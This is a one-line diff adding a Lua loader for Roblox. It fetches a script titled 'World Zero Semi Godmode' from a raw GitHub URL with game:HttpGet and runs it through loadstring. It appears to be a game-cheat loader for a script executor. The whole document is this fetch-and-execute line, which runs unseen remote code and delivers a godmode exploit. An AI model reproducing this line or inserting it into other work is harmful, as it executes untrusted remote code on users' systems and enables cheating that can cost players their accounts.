@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/0ho1/scripts/278f15840f85fcaf7bbf121c6070bf0c10e1cb78/World%20Zero%20Semi%20Godmode'))()
